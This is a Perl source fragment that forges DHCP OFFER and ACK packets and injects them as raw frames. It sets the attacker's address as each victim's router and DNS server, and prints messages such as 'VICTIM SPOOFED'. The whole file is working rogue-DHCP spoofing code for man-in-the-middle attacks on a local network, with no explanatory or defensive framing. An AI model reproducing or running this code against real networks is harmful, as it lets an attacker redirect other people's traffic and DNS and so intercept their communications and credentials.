sub ForgeDHCPServer
{
    my $dhcp_packet = Net::DHCP::Packet->new(
        'Chaddr' => $_[4],
        'Xid' => $_[0],
        'Yiaddr' => $_[1],
        'Giaddr' => $_[2],
        'Hops' => 1);
    $dhcp_packet->addOptionValue(DHO_DHCP_MESSAGE_TYPE(), $_[3]);
    $dhcp_packet->addOptionValue(DHO_DHCP_LEASE_TIME(), "3600");
    $dhcp_packet->addOptionValue(DHO_DHCP_SERVER_IDENTIFIER(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_DOMAIN_NAME_SERVERS(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_SUBNET_MASK(), "255.255.255.0");
    $dhcp_packet->addOptionValue(DHO_ROUTERS(), $_[2]);
    $dhcp_packet->addOptionValue(DHO_DOMAIN_NAME(), "HAXXOR.NET");
    
    if ($_[3] == 5)
    {
        print "/!\\ DHCPACK SENT ! VICTIM SPOOFED [Transaction ID : $_[0]] /!\\\n";
    }
    elsif ($_[3] == 2)
    {
        print "/!\\ PREAUTH OFFER SENT ! /!\\\n";
    }
    SendDHCPResponse($_[1],$dhcp_packet,$_[4]);
}

sub MacFormat
{
    return join ":", ($_[0] =~ /([[:xdigit:]]{2})/g);
}

sub SendDHCPResponse
{
    my $packet = Net::RawIP->new({
                          ip => {
                                saddr => '192.168.0.1',
                                daddr => $_[0],
                                },

                          udp => {
                                source => 67,
                                dest => 68,
                                data => $_[1]->serialize(),
                                },
                          });
    $packet->ethnew("p5p1");
    $packet->ethset(source => 'c8:60:00:42:21:3c',dest => MacFormat($_[2]));    
    $packet->ethsend;
}

return 1;